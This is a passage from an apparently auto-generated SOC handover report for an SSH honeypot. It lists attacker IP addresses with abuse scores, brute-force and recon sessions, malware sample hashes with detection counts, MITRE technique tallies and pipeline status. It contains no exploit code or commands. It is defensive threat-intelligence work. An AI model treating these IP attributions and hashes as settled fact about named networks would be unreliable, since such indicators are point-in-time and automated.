- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd3cf2aea53

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:55 |
| **Last Seen** | 2026-05-30 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:55:27` | `cowrie.session.connect` |
| `2026-05-30 15:55:27` | `cowrie.client.version` |
| `2026-05-30 15:55:27` | `cowrie.client.kex` |
| `2026-05-30 15:55:28` | `cowrie.login.success` |
| `2026-05-30 15:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.65.226[.]52` | **12** | 2026-05-30 15:31 | 2026-05-30 15:41 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `103.191.92[.]236` | **10** | 2026-05-30 15:45 | 2026-05-30 15:56 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.25[.]100` | **6** | 2026-05-30 15:20 | 2026-05-30 16:39 | 3m | 0 | `T1592` | 🟢 LOW |
| `1.214.29[.]155` | 1 | 2026-05-30 15:42 | 2026-05-30 15:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.145.245[.]82` | 1 | 2026-05-30 17:06 | 2026-05-30 17:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-05-30 16:11 | 2026-05-30 16:12 | 47s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-05-30 15:37 | 2026-05-30 15:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `173.19.19[.]38` | 1 | 2026-05-30 16:26 | 2026-05-30 16:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `183.222.230[.]188` | 1 | 2026-05-30 16:49 | 2026-05-30 16:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.48.191[.]19` | 1 | 2026-05-30 16:29 | 2026-05-30 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.154.138[.]219` | 1 | 2026-05-30 15:47 | 2026-05-30 15:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.233.83[.]104` | 1 | 2026-05-30 15:43 | 2026-05-30 15:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.95[.]116` | 1 | 2026-05-30 16:12 | 2026-05-30 16:12 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `216.48.191[.]19` | IN | E2E Networks Limited | **100** ⚠️ | 1 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `45.65.226[.]52` | AR | SOLUTION LAN S.A | **100** ⚠️ | 4 |
| `118.145.245[.]82` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 21 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `183.222.230[.]188` | CN | China Mobile Communications Corporation | **100** ⚠️ | 5 |
| `173.19.19[.]38` | US | MEDIACOMCC | **100** ⚠️ | 11 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `1.214.29[.]155` | KR | LG Uplus | **100** ⚠️ | 36 |
| `220.154.138[.]219` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 31 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 16 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 72 cases |
| Tool 34  | Credential Extractor        | ✅ 26 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (27.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 13 recon entry/entries in table (3 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-30T17:12:59Z_
